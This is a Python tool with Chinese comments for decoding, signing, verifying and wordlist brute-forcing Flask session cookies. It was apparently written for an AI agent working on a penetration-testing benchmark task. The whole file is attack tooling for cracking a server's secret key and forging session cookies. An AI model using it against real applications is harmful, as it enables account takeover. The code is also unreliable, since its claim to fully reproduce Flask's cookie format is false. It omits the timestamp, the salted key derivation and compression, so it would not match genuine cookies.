#!/usr/bin/env python3
"""flask-session.py —— 纯标准库的 Flask session 签名/验签/爆破（不依赖 itsdangerous）。

★ 当前状态（2026-11-19 更正）：容器里 `import flask, itsdangerous` **已可用**
（flask 3.1.3 + itsdangerous，实测 python3 经 _pi_venv.pth 可见）。
**能直接 import 就优先直接 import**，本脚本只是「不想引第三方依赖 / 环境又退化了」时的纯标准库退路。

来历（2026-11-14 实测，当时属实、现已不成立）：那时 py 环境**没有 itsdangerous / flask**，
agent 在 xben-101 写 `from itsdangerous import URLSafeTimedSerializer` 全部 ImportError，
整轮 300 秒白烧。Flask 的 session cookie 本质就是
    base64url(payload) + "." + base64url(hmac_sha1(secret, payload_b64) 的压缩形式)
用标准库就能完全复现，不需要第三方包 —— 这个能力保留着，但不再是唯一选择。

用法：
  python3 flask-session.py sign    <secret> '<json>'
  python3 flask-session.py verify  <secret> <cookie>
  python3 flask-session.py brute   <cookie> <wordlist>
  python3 flask-session.py decode  <cookie>
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import sys


def b64url_compress(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decompress(data: str) -> bytes:
    pad = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + pad)


def sign(secret: str, payload: dict) -> str:
    raw = json.dumps(payload, separators=(",", ":")).encode()
    body = b64url_compress(raw)
    mac = hmac.new(secret.encode(), body.encode(), hashlib.sha1).digest()
    return f"{body}.{b64url_compress(mac)}"


def verify(secret: str, cookie: str) -> bool:
    try:
        body, sig = cookie.split(".", 1)
    except ValueError:
        return False
    mac = hmac.new(secret.encode(), body.encode(), hashlib.sha1).digest()
    return hmac.compare_digest(b64url_compress(mac), sig)


def decode(cookie: str) -> str:
    try:
        body = cookie.split(".", 1)[0]
        return b64url_decompress(body).decode("utf-8", "replace")
    except Exception as exc:  # noqa: BLE001
        return f"<decode failed: {exc}>"


def brute(cookie: str, wordlist: str) -> str | None:
    try:
        with open(wordlist, encoding="utf-8", errors="replace") as fh:
            for line in fh:
                secret = line.rstrip("\r\n")
                if secret and verify(secret, cookie):
                    return secret
    except OSError as exc:
        print(f"读词典失败: {exc}", file=sys.stderr)
    return None


def main() -> int:
    if len(sys.argv) < 3:
        print(__doc__)
        return 2
    cmd = sys.argv[1]
    if cmd == "sign" and len(sys.argv) >= 4:
        print(sign(sys.argv[2], json.loads(sys.argv[3])))
        return 0
    if cmd == "verify" and len(sys.argv) >= 4:
        print("OK" if verify(sys.argv[2], sys.argv[3]) else "NO")
        return 0
    if cmd == "decode" and len(sys.argv) >= 3:
        print(decode(sys.argv[2]))
        return 0
    if cmd == "brute" and len(sys.argv) >= 4:
        hit = brute(sys.argv[2], sys.argv[3])
        print(f"SECRET={hit}" if hit else "未命中")
        return 0
    print(__doc__)
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
